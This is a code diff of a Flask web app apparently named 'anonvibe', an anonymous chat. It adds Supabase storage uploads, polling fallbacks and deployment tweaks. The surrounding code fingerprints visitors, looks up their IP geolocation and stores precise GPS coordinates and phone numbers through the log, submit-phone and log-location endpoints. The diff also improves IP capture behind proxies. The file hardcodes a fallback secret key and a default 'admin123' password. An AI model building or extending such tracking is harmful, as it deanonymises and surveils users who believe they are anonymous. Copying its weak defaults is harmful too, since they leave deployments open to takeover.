@@ -1,8 +1,9 @@
 import os
 import hashlib
 import json
-from datetime import datetime, timezone
+import random
 import requests
+from datetime import datetime, timezone
 from flask import Flask, render_template_string, request, jsonify, send_from_directory, session, redirect, url_for
 from flask_sqlalchemy import SQLAlchemy
 from flask_socketio import SocketIO, emit
@@ -11,20 +12,59 @@ from werkzeug.security import generate_password_hash, check_password_hash
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'anonvibe-dev-key-772211')
-# For Render/Production: use DATABASE_URL if available, else fallback to sqlite
-db_url = os.environ.get('DATABASE_URL')
-if db_url and db_url.startswith("postgres://"):
-    db_url = db_url.replace("postgres://", "postgresql://", 1)
-app.config['SQLALCHEMY_DATABASE_URI'] = db_url or 'sqlite:///anonvibe.db'
+
+# For Render / Vercel / Supabase: use DATABASE_URL or SUPABASE_DB_URL if available
+db_url = os.environ.get('DATABASE_URL') or os.environ.get('SUPABASE_DB_URL')
+if db_url:
+    if db_url.startswith("postgres://"):
+        db_url = db_url.replace("postgres://", "postgresql://", 1)
+    if "sslmode" not in db_url and "localhost" not in db_url and "127.0.0.1" not in db_url:
+        db_url += "?sslmode=require" if "?" not in db_url else "&sslmode=require"
+    app.config['SQLALCHEMY_DATABASE_URI'] = db_url
+else:
+    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(
+        '/tmp' if os.path.exists('/tmp') and not os.access('.', os.W_OK) else '.', 'anonvibe.db'
+    )
+
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
-app.config['UPLOAD_FOLDER'] = 'uploads'
+app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {'pool_pre_ping': True}
+
+# Uploads configuration
+UPLOAD_FOLDER = os.path.join('/tmp' if os.path.exists('/tmp') and not os.access('.', os.W_OK) else '.', 'uploads')
+app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 app.config['MAX_CONTENT_LENGTH'] = 10 * 1024 * 1024  # 10MB
 
-if not os.path.exists(app.config['UPLOAD_FOLDER']):
-    os.makedirs(app.config['UPLOAD_FOLDER'])
+if not os.path.exists(UPLOAD_FOLDER):
+    try:
+        os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+    except Exception:
+        pass
 
 db = SQLAlchemy(app)
-socketio = SocketIO(app, cors_allowed_origins="*")
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode="gevent" if os.environ.get("VERCEL") else None)
+
+# --- Supabase Storage Helpers ---
+SUPABASE_URL = os.environ.get('SUPABASE_URL', '').rstrip('/')
+SUPABASE_KEY = os.environ.get('SUPABASE_SERVICE_ROLE_KEY') or os.environ.get('SUPABASE_KEY') or os.environ.get('SUPABASE_ANON_KEY')
+SUPABASE_BUCKET = os.environ.get('SUPABASE_BUCKET', 'anonvibe-uploads')
+
+def upload_to_supabase(file_bytes, filename, content_type):
+    if not SUPABASE_URL or not SUPABASE_KEY:
+        return None
+    try:
+        url = f"{SUPABASE_URL}/storage/v1/object/{SUPABASE_BUCKET}/{filename}"
+        headers = {
+            "Authorization": f"Bearer {SUPABASE_KEY}",
+            "apiKey": SUPABASE_KEY,
+            "Content-Type": content_type or "application/octet-stream",
+            "x-upsert": "true"
+        }
+        res = requests.post(url, headers=headers, data=file_bytes, timeout=10)
+        if res.status_code in [200, 201]:
+            return f"{SUPABASE_URL}/storage/v1/object/public/{SUPABASE_BUCKET}/{filename}"
+    except Exception as e:
+        print("Supabase Storage upload error:", e)
+    return None
 
 # --- Models ---
 class Visit(db.Model):
@@ -43,7 +83,6 @@ class Visit(db.Model):
     precise_lon = db.Column(db.Float)
     accuracy = db.Column(db.Float)
     user_agent = db.Column(db.Text)
-    # New fingerprinting fields
     platform = db.Column(db.String(100))
     max_touch_points = db.Column(db.Integer)
     hardware_concurrency = db.Column(db.Integer)
@@ -62,14 +101,16 @@ class Admin(db.Model):
     username = db.Column(db.String(80), unique=True, nullable=False)
     password_hash = db.Column(db.String(200), nullable=False)
 
-with app.app_context():
-    db.create_all()
-    # Bootstrap admin if none exists
-    if not Admin.query.filter_by(username='admin').first():
-        hashed_pw = generate_password_hash(os.environ.get('ADMIN_PASSWORD', 'admin123'))
-        new_admin = Admin(username='admin', password_hash=hashed_pw)
-        db.session.add(new_admin)
-        db.session.commit()
+try:
+    with app.app_context():
+        db.create_all()
+        if not Admin.query.filter_by(username='admin').first():
+            hashed_pw = generate_password_hash(os.environ.get('ADMIN_PASSWORD', 'admin123'))
+            new_admin = Admin(username='admin', password_hash=hashed_pw)
+            db.session.add(new_admin)
+            db.session.commit()
+except Exception as e:
+    print("Database init warning:", e)
 
 # --- Templates ---
 
@@ -175,8 +216,10 @@ INDEX_HTML = """
     </div>
 
     <script>
-        let socket = io();
+        let socket = null;
         let fingerprint = '';
+        let lastMsgId = 0;
+        let renderedMsgIds = new Set();
 
         async function getFingerprint() {
             const canvas = document.createElement('canvas');
@@ -268,51 +311,91 @@ INDEX_HTML = """
             }
         }
 
-        function initChat() {
-            socket.on('new_message', (msg) => {
-                const messagesDiv = document.getElementById('messages');
-                const isMine = msg.fingerprint === fingerprint;
+        function renderMessage(msg) {
+            if (renderedMsgIds.has(msg.id)) return;
+            renderedMsgIds.add(msg.id);
+            if (msg.id > lastMsgId) lastMsgId = msg.id;
 
-                const msgEl = document.createElement('div');
-                msgEl.className = `flex ${isMine ? 'justify-end' : 'justify-start'} mb-4`;
+            const messagesDiv = document.getElementById('messages');
+            const isMine = msg.fingerprint === fingerprint;
 
-                const bubbleEl = document.createElement('div');
-                bubbleEl.className = `max-w-[80%] ${isMine ? 'bg-green-900 text-white' : 'bg-zinc-800 text-green-100'} px-5 py-3 rounded-2xl shadow-lg border border-white/5`;
+            const msgEl = document.createElement('div');
+            msgEl.className = `flex ${isMine ? 'justify-end' : 'justify-start'} mb-4`;
 
-                if (msg.text) {
-                    const textEl = document.createElement('p');
-                    textEl.textContent = msg.text;
-                    bubbleEl.appendChild(textEl);
-                } else if (msg.attachment) {
-                    const linkEl = document.createElement('a');
-                    linkEl.href = msg.attachment;
-                    linkEl.target = "_blank";
-                    linkEl.className = "flex items-center gap-2 text-blue-400 underline";
-                    linkEl.innerHTML = `
-                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M15.172 7l-6.586 6.586a2 2 0 102.828 2.828l6.414-6.586a4 4 0 00-5.656-5.656l-6.415 6.585a6 6 0 108.486 8.486L20.5 13"></path></svg>
-                        <span></span>
-                    `;
-                    linkEl.querySelector('span').textContent = msg.filename;
-                    bubbleEl.appendChild(linkEl);
-                }
+            const bubbleEl = document.createElement('div');
+            bubbleEl.className = `max-w-[80%] ${isMine ? 'bg-green-900 text-white' : 'bg-zinc-800 text-green-100'} px-5 py-3 rounded-2xl shadow-lg border border-white/5`;
 
-                const timeEl = document.createElement('div');
-                timeEl.className = "text-[10px] opacity-40 mt-1";
-                timeEl.textContent = new Date(msg.timestamp).toLocaleTimeString();
-                bubbleEl.appendChild(timeEl);
+            if (msg.text) {
+                const textEl = document.createElement('p');
+                textEl.textContent = msg.text;
+                bubbleEl.appendChild(textEl);
+            } else if (msg.attachment) {
+                const linkEl = document.createElement('a');
+                linkEl.href = msg.attachment;
+                linkEl.target = "_blank";
+                linkEl.className = "flex items-center gap-2 text-blue-400 underline";
+                linkEl.innerHTML = `
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M15.172 7l-6.586 6.586a2 2 0 102.828 2.828l6.414-6.586a4 4 0 00-5.656-5.656l-6.415 6.585a6 6 0 108.486 8.486L20.5 13"></path></svg>
+                    <span></span>
+                `;
+                linkEl.querySelector('span').textContent = msg.filename || "Attachment";
+                bubbleEl.appendChild(linkEl);
+            }
 
-                msgEl.appendChild(bubbleEl);
-                messagesDiv.appendChild(msgEl);
-                messagesDiv.scrollTop = messagesDiv.scrollHeight;
-            });
+            const timeEl = document.createElement('div');
+            timeEl.className = "text-[10px] opacity-40 mt-1";
+            timeEl.textContent = new Date(msg.timestamp).toLocaleTimeString();
+            bubbleEl.appendChild(timeEl);
+
+            msgEl.appendChild(bubbleEl);
+            messagesDiv.appendChild(msgEl);
+            messagesDiv.scrollTop = messagesDiv.scrollHeight;
         }
 
-        function sendMessage() {
+        async function fetchMessages() {
+            try {
+                const res = await fetch(`/api/messages?after_id=${lastMsgId}`);
+                if (res.ok) {
+                    const messages = await res.json();
+                    messages.forEach(renderMessage);
+                }
+            } catch (e) {
+                console.error("Fetch messages error:", e);
+            }
+        }
+
+        function initChat() {
+            fetchMessages();
+            setInterval(fetchMessages, 3000);
+
+            try {
+                socket = io({ transports: ['polling', 'websocket'] });
+                socket.on('new_message', (msg) => {
+                    renderMessage(msg);
+                });
+            } catch (e) {
+                console.log("SocketIO init fallback:", e);
+            }
+        }
+
+        async function sendMessage() {
             const input = document.getElementById('messageInput');
             const text = input.value.trim();
-            if (text) {
-                socket.emit('send_message', { text, fingerprint });
-                input.value = '';
+            if (!text) return;
+            input.value = '';
+
+            try {
+                const res = await fetch('/api/send-message', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ text, fingerprint })
+                });
+                if (res.ok) {
+                    const msg = await res.json();
+                    renderMessage(msg);
+                }
+            } catch (e) {
+                if (socket) socket.emit('send_message', { text, fingerprint });
             }
         }
 
@@ -328,7 +411,8 @@ INDEX_HTML = """
             fetch('/api/send-attachment', {
                 method: 'POST',
                 body: formData
-            }).then(() => {
+            }).then(res => res.json()).then(msg => {
+                if (msg && msg.id) renderMessage(msg);
                 fileInput.value = '';
             });
         }
@@ -504,19 +588,18 @@ def get_geo(ip):
         resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
         if resp.status_code == 200:
             return resp.json()
-    except:
+    except Exception:
         pass
     return {}
 
 @app.route('/')
 def index():
-    import random
     return render_template_string(INDEX_HTML, session_id=random.randint(1000, 9999))
 
 @app.route('/api/log', methods=['POST'])
 def log_visit():
-    data = request.json
-    ip = request.remote_addr
+    data = request.json or {}
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
     geo = get_geo(ip)
     fp_data = data.get('fpData', {})
 
@@ -541,7 +624,7 @@ def log_visit():
 
 @app.route('/api/submit-phone', methods=['POST'])
 def submit_phone():
-    data = request.json
+    data = request.json or {}
     visit = Visit.query.filter_by(fingerprint=data.get('fingerprint')).order_by(Visit.timestamp.desc()).first()
     if visit:
         visit.phone = data.get('phone')
@@ -550,7 +633,7 @@ def submit_phone():
 
 @app.route('/api/log-location', methods=['POST'])
 def log_location():
-    data = request.json
+    data = request.json or {}
     visit = Visit.query.filter_by(fingerprint=data.get('fingerprint')).order_by(Visit.timestamp.desc()).first()
     if visit:
         visit.precise_lat = data.get('lat')
@@ -558,6 +641,44 @@ def log_location():
         visit.accuracy = data.get('accuracy')
         db.session.commit()
     return jsonify({"status": "success"})
+
+@app.route('/api/messages', methods=['GET'])
+def get_messages():
+    after_id = request.args.get('after_id', 0, type=int)
+    messages = Message.query.filter(Message.id > after_id).order_by(Message.id.asc()).all()
+    return jsonify([{
+        "id": m.id,
+        "timestamp": m.timestamp.isoformat(),
+        "fingerprint": m.fingerprint,
+        "text": m.text,
+        "attachment": m.attachment_path,
+        "filename": m.filename
+    } for m in messages])
+
+@app.route('/api/send-message', methods=['POST'])
+def http_send_message():
+    data = request.json or {}
+    text = data.get('text')
+    fingerprint = data.get('fingerprint')
+    if not text:
+        return jsonify({"error": "Empty message"}), 400
+
+    msg = Message(fingerprint=fingerprint, text=text)
+    db.session.add(msg)
+    db.session.commit()
+
+    payload = {
+        'id': msg.id,
+        'timestamp': msg.timestamp.isoformat(),
+        'fingerprint': msg.fingerprint,
+        'text': msg.text
+    }
+    try:
+        socketio.emit('new_message', payload)
+    except Exception:
+        pass
+
+    return jsonify(payload)
 
 @app.route('/api/send-attachment', methods=['POST'])
 def send_attachment():
@@ -570,26 +691,42 @@ def send_attachment():
 
     filename = secure_filename(file.filename)
     unique_filename = f"{int(datetime.now(timezone.utc).timestamp())}_{filename}"
-    filepath = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)
-    file.save(filepath)
+    file_bytes = file.read()
+
+    # Try uploading to Supabase Storage first
+    supabase_public_url = upload_to_supabase(file_bytes, unique_filename, file.mimetype)
+
+    if supabase_public_url:
+        attachment_path = supabase_public_url
+    else:
+        # Fallback to local / tmp storage
+        filepath = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)
+        with open(filepath, 'wb') as f:
+            f.write(file_bytes)
+        attachment_path = f"/uploads/{unique_filename}"
 
     msg = Message(
         fingerprint=fingerprint,
-        attachment_path=f"/uploads/{unique_filename}",
+        attachment_path=attachment_path,
         filename=filename
     )
     db.session.add(msg)
     db.session.commit()
 
-    socketio.emit('new_message', {
+    payload = {
         'id': msg.id,
         'timestamp': msg.timestamp.isoformat(),
         'fingerprint': msg.fingerprint,
         'attachment': msg.attachment_path,
         'filename': msg.filename
-    })
+    }
 
-    return jsonify({"status": "success"})
+    try:
+        socketio.emit('new_message', payload)
+    except Exception:
+        pass
+
+    return jsonify(payload)
 
 @app.route('/uploads/<filename>')
 def uploaded_file(filename):
